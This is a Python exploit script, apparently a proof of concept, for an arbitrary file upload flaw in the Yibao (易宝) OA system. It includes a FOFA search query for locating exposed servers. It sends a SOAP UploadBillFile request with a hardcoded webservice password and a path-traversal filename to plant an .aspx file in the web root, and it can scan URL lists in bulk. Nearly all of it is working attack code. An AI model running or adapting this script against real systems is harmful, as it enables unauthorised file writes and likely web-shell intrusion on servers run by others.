#fofa:title="欢迎登录易宝OA系统"||banner="易宝OA"
# -*- coding: utf-8 -*-
import argparse
import requests

#单个url检测
def checkvul(url):
    #请求包信息
    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:UploadBillFile>
         <!--type: base64Binary-->
         <tem:fs>bmloYW8=</tem:fs>
         <!--type: string-->
         <tem:FileName>../../manager/hello.aspx</tem:FileName>
         <!--type: string-->
         <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
      </tem:UploadBillFile>
   </soapenv:Body>
</soapenv:Envelope>'''
    headers = {
        'Content-Type':'text/xml;charset=UTF-8',
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0'
    }
    #拼接url路径
    url1 = url + '/WebService/BasicService.asmx'
    #发起post请求
    try:
        request = requests.post(url1,headers=headers,data=data,timeout=6,verify=False)
        res = request.status_code
        req = requests.get(url+ '/hello.aspx')
        txt = req.text
        filename = './易宝OA'
        if res == 200 and ('nihao' in txt):
             with open(filename,'a') as f:
                f.write(url.strip()+"/hello.aspx"+'\n')
                print(f'【+++】{url.strip()}'+"/hello.aspx"+'存在漏洞【+++】')
        else:
            print(f'{url.strip()}不存在漏洞')
    except Exception as e:
        print(f'发生错误：{e}')
def checkvuls(filename):
    with open(filename,'r') as f:
        for readline in f.readlines():
            checkvul(readline.strip())

def banner():
    info = '''
$$\     $$\ $$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\                      $$\           
\$$\   $$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\                     \__|          
 \$$\ $$  / $$ |  $$ |$$ /  $$ |$$ /  $$ |$$ |  $$ | $$$$$$\   $$$$$$$\ $$\  $$$$$$$\ 
  \$$$$  /  $$$$$$$\ |$$ |  $$ |$$$$$$$$ |$$$$$$$\ | \____$$\ $$  _____|$$ |$$  _____|
   \$$  /   $$  __$$\ $$ |  $$ |$$  __$$ |$$  __$$\  $$$$$$$ |\$$$$$$\  $$ |$$ /      
    $$ |    $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$  __$$ | \____$$\ $$ |$$ |      
    $$ |    $$$$$$$  | $$$$$$  |$$ |  $$ |$$$$$$$  |\$$$$$$$ |$$$$$$$  |$$ |\$$$$$$$\ 
    \__|    \_______/  \______/ \__|  \__|\_______/  \_______|\_______/ \__| \_______|'''
    print(info)
    print('-u http://www.xxx.com  即可进行单个url漏洞检测')
    print('-l targetUrl.txt  即可对选中文档中的网址进行批量检测')
    print('--help 查看更多详细帮助信息')
    print('author：ni1hao')
def main():
    arg = argparse.ArgumentParser(description='易宝OA UploadPersonalFile存在任意文件上传漏洞')
    arg.add_argument('-u',help='单个url漏洞检测')
    arg.add_argument('-l', help='批量检测漏洞（后面添加检测文件地址）')
    args = arg.parse_args()
    try:
        if args.u or args.l:
            if args.u:
                checkvul(args.u)
            else:
                checkvuls(args.l)
        else:
            banner()
    except Exception as  e:
        print(f'程序出现错误{e}')
if __name__ == '__main__':
    main()


